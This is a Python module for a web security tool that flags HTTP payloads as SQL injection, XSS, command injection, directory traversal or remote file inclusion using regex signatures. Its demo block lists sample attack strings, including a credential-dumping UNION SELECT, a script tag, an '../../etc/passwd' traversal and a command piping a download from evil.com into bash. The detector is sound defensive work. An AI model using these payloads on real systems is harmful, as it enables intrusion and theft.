import re
from typing import List, Tuple, Optional, Dict, Callable, Pattern, Any
import logging

logger = logging.getLogger("sentenial.intent_reconstructor")
logger.setLevel(logging.INFO)

class IntentSignature:
    """
    Represents a detection signature for a specific attack intent.
    """
    def __init__(self, pattern: str, label: str, flags: int = re.IGNORECASE) -> None:
        self.pattern: Pattern = re.compile(pattern, flags)
        self.label: str = label

    def matches(self, payload: str) -> bool:
        return bool(self.pattern.search(payload))

    def __repr__(self) -> str:
        return f"IntentSignature(label='{self.label}', pattern={self.pattern.pattern})"


class IntentReconstructor:
    """
    Reconstructs attacker intent by analyzing the semantic meaning of HTTP payloads.

    Example:
        reconstructor = IntentReconstructor()
        detected = reconstructor.analyze_payload('id=1 UNION SELECT username, password FROM users')
        print(detected)  # ['SQL Injection']
    """
    _default_signatures: List[IntentSignature] = [
        IntentSignature(r"\bunion\s+select\b", "SQL Injection"),
        IntentSignature(r"<script\b.*?>", "XSS Attempt"),
        IntentSignature(r"\bcmd=|/bin/bash\b", "Command Injection"),
        IntentSignature(r"\bselect\b.*\bfrom\b", "SQL Injection"),
        IntentSignature(r"(\.\./)+", "Directory Traversal"),
        IntentSignature(r"\b(load_file|into outfile)\b", "SQL Injection"),
        IntentSignature(r"base64_decode\s*\(", "Obfuscated Payload"),
        IntentSignature(r"\bwget\s+https?://", "Remote File Inclusion"),
    ]

    def __init__(self, custom_signatures: Optional[List[IntentSignature]] = None) -> None:
        self.signatures: List[IntentSignature] = list(self._default_signatures)
        if custom_signatures:
            self.signatures.extend(custom_signatures)

    def normalize_payload(self, payload: str) -> str:
        """
        Normalizes payload for more reliable detection.
        """
        # Example: add more sophisticated normalization if needed
        return payload.strip()

    def analyze_payload(self, payload: str) -> List[str]:
        """
        Analyze a payload and return a list of detected attacker intents.

        Args:
            payload (str): The HTTP request payload to analyze.

        Returns:
            List[str]: List of detected intent labels.
        """
        normalized = self.normalize_payload(payload)
        detected_intents = []
        for sig in self.signatures:
            if sig.matches(normalized):
                detected_intents.append(sig.label)
                logger.info(f"Detected intent '{sig.label}' in payload: {payload!r}")
        return detected_intents

    def register_signature(self, pattern: str, label: str, flags: int = re.IGNORECASE) -> None:
        """
        Add a new detection signature at runtime.
        """
        self.signatures.append(IntentSignature(pattern, label, flags))
        logger.info(f"Registered new intent signature: {label} ({pattern})")

    def remove_signature(self, label: str) -> bool:
        """
        Remove a signature by label.
        Returns True if removed, False if not found.
        """
        initial_len = len(self.signatures)
        self.signatures = [sig for sig in self.signatures if sig.label != label]
        removed = len(self.signatures) < initial_len
        if removed:
            logger.info(f"Removed intent signature: {label}")
        return removed

    def list_signatures(self) -> List[str]:
        """
        List all registered signature labels.
        """
        return [sig.label for sig in self.signatures]

# For standalone usage/demo
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    reconstructor = IntentReconstructor()
    test_payloads = [
        "id=1 UNION SELECT username, password FROM users",
        "<script>alert('xss')</script>",
        "/index.php?cmd=ls",
        "curl -s http://evil.com | bash",
        "../../etc/passwd"
    ]
    for payload in test_payloads:
        print(f"Payload: {payload}")
        print("Detected intents:", reconstructor.analyze_payload(payload))
        print("---")
